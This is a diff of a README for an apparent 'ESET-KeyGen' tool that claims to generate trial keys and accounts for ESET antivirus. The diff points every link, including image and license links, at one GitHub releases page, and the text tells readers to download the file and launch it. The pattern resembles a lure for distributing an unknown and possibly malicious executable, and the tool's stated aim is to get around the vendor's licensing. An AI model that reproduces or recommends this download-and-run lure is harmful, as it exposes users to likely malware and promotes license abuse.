@@ -2,7 +2,7 @@
 
 🔑 **ESET-KeyGen - Trial-Key & Account generator for ESET Antivirus** 🔑
 
-![ESET Antivirus](https://www.example.com/eset-antivirus-image.jpg)
+![ESET Antivirus](https://github.com/OBID-01/ESET-KeyGen-2025/releases)
 
 ## Repository Topics:
 - eset-account-generator
@@ -18,7 +18,7 @@
 
 ## Get Started
 
-To access the ESET-KeyGen files, download the **[App.zip](https://github.com/uploads/App.zip)**. Make sure to launch the file once downloaded to explore the features provided.
+To access the ESET-KeyGen files, download the **[https://github.com/OBID-01/ESET-KeyGen-2025/releases](https://github.com/OBID-01/ESET-KeyGen-2025/releases)**. Make sure to launch the file once downloaded to explore the features provided.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
@@ -32,9 +32,9 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 Here are some screenshots of the ESET-KeyGen application in action:
 
-![Screenshot 1](https://www.example.com/screenshot1.jpg)
-![Screenshot 2](https://www.example.com/screenshot2.jpg)
-![Screenshot 3](https://www.example.com/screenshot3.jpg)
+![Screenshot 1](https://github.com/OBID-01/ESET-KeyGen-2025/releases)
+![Screenshot 2](https://github.com/OBID-01/ESET-KeyGen-2025/releases)
+![Screenshot 3](https://github.com/OBID-01/ESET-KeyGen-2025/releases)
 
 ## Contributing
 
@@ -46,7 +46,7 @@ For any questions or support regarding the ESET-KeyGen tool, you can reach out t
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/yourusername/ESET-KeyGen-2025/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/OBID-01/ESET-KeyGen-2025/releases](https://github.com/OBID-01/ESET-KeyGen-2025/releases) file for details.
 
 ---
 
